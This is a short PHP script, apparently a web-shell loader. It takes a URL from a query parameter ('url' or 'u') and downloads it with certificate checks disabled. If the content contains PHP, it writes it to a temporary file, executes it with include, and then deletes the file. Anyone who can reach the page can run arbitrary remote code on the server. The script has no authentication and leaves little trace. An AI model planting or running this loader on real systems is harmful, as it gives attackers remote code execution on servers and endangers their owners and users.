<?php
$url=isset($_GET['url'])?$_GET['url']:(isset($_GET['u'])?$_GET['u']:'');
if(empty($url)){die("Usage: ?url=<github_raw_url>");}
echo "Downloading: $url\n";
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch,CURLOPT_TIMEOUT,30);
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0');
$content=curl_exec($ch);
$http=curl_getinfo($ch,CURLINFO_HTTP_CODE);
curl_close($ch);
if($http==200 && $content!==false){
    echo "Download success! (".strlen($content)." bytes)\n";
    if(strpos($content,'<?php')!==false){
        $tmp=tempnam(sys_get_temp_dir(),'php_');
        file_put_contents($tmp,$content);
        include($tmp);
        unlink($tmp);
    }else{
        echo $content;
    }
}else{
    echo "Download failed! HTTP Code: $http\n";
    echo "Check URL: $url";
}
?>
